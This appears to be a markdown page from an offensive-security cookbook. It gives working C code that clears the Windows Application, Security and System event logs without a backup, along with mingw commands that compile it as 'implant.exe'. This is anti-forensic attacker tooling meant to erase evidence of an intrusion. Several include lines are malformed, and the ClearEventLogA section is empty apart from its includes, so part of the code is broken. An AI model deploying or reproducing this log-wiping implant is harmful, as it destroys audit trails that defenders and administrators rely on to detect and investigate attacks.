# Clear Event Logs

## ClearEventLog

### C

Clear a single event log.

```c
#include <stdio.h>
#include <windows.h>
#include <winbase.h

int main() {
    HANDLE handle_event_log;
    LPCSTR event_log_name = "Application";

    // Open the event log
    handle_event_log = OpenEventLog(NULL, event_log_name);
    if (handle_event_log == NULL) {
        printf("Failed to open event log. Error: %lu\n", GetLastError());
        return 1;
    }

    // Clear the event log without saving a backup
    if (ClearEventLog(handle_event_log, NULL) == 0) {
        printf("Failed to clear event log. Error: %lu\n", GetLastError());
        CloseEventLog(handle_event_log);
        return 1;
    }

    printf("Successfully cleared the event log: %s\n", event_log_name);

    CloseEventLog(handle_event_log);

    return 0;
}
```

Clear multiple event logs.

```c
#include <stdio.h>
#include <windows.h>
#include <winbase.h

int main() {
    HANDLE handle_event_log;
    LPCSTR event_log_names[] = {"Application", "Security", "System"};

    // Loop through each log and attempt to clear it
    for (int i = 0; i < sizeof(event_log_names) / sizeof(event_log_names[0]); i++) {
        // Open the event log
        handle_event_log = OpenEventLog(NULL, event_log_names[i]);
        if (handle_event_log == NULL) {
            printf("Failed to open event log: %s. Error: %lu\n", event_log_names[i], GetLastError());
            continue;  // Move to the next log if opening fails
        }

        // Clear the event log without saving a backup
        if (ClearEventLog(handle_event_log, NULL) == 0) {
            printf("Failed to clear event log: %s. Error: %lu\n", event_log_names[i], GetLastError());
        } else {
            printf("Successfully cleared the event log: %s\n", event_log_names[i]);
        }

        CloseEventLog(handle_event_log);
    }

    return 0;
}
```

To compile the implant.

```
$ x86_64-w64-mingw32-gcc -l advapi32 -o implant.exe implant.c
```

## ClearEventLogA

### C

```c
#include <stdio.h>
#include <windows.h>
#include <winbase.h
```

To compile the implant.

```
$ x86_64-w64-mingw32-gcc -l advapi32 -o implant.exe implant.c
```

---
## References

- [OpenEventLogA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-openeventloga)

- [OpenEventLogW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-openeventlogw)

- [ClearEventLog](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/eventlogprov/cleareventlog-method-in-class-win32-nteventlogfile)

- [ClearEventLogA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-cleareventloga)

- [ClearEventLogW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-cleareventlogw)

- [CloseEventLog](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-closeeventlog)